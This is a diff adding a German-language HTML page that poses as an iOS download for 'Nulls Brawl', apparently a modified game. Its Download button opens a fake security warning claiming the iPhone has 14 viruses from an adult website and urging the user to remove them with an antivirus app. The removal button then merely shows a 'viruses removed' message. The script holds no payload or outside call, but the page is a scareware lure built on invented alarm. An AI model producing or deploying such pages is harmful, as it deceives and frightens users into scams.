@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <title>Nulls Brawl iOS Download</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
+    }
+
+    .main {
+      margin-top: 100px;
+    }
+
+    .download-btn {
+      padding: 15px 30px;
+      background-color: #007aff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      justify-content: center;
+      align-items: center;
+      z-index: 10;
+    }
+
+    .popup {
+      background: white;
+      padding: 25px;
+      width: 90%;
+      max-width: 400px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+
+    .popup h2 {
+      font-size: 22px;
+      margin-bottom: 10px;
+    }
+
+    .popup p {
+      font-size: 16px;
+      margin-bottom: 15px;
+    }
+
+    .popup-warning {
+      color: orange;
+      margin: 10px 0;
+    }
+
+    .popup-btn {
+      padding: 10px 20px;
+      background-color: #007aff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<div class="main">
+  <h1>Nulls Brawl für iOS</h1>
+  <button class="download-btn" onclick="showPopup()">Download</button>
+</div>
+
+<div class="popup-overlay" id="popup">
+  <div class="popup" id="popupContent">
+    <h2>⚠️ Sicherheitswarnung</h2>
+    <p>Ihr iPhone wurde mit <b>14 Viren</b> infiziert, nachdem Sie eine Website für Erwachsene besucht haben.</p>
+    <p>Klicken Sie auf die Schaltfläche unten, um die Viren mithilfe der Antivirus-App zu entfernen.</p>
+    <div class="popup-warning">⚠️ Entfernen Sie die Viren, um erhebliche Probleme beim Betrieb und Datenverlust zu vermeiden.</div>
+    <button class="popup-btn" onclick="removeVirus()">Entfernen Sie alle Viren</button>
+  </div>
+</div>
+
+<script>
+  function showPopup() {
+    document.getElementById("popup").style.display = "flex";
+  }
+
+  function removeVirus() {
+    const content = document.getElementById("popupContent");
+    content.innerHTML = `
+      <h2>✅ Viren entfernt</h2>
+      <p>Alle Viren wurden vom Gerät erfolgreich entfernt.</p>
+      <p>Sie brauchen sich keine Gedanken machen.</p>
+    `;
+  }
+</script>
+
+</body>
+</html>
